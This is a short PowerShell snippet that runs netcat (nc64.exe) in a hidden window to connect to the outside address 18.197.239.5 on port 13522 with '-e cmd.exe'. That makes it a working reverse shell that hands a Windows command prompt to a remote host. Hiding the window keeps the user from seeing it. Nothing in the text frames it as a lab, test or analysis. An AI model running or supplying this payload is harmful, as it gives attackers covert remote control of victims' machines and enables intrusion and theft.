$command = ".\nc64.exe 18.197.239.5 13522 -e cmd.exe"
Start-Process "powershell.exe" -ArgumentList "-NoProfile -Command `"& { $command }`"" -WindowStyle Hidden
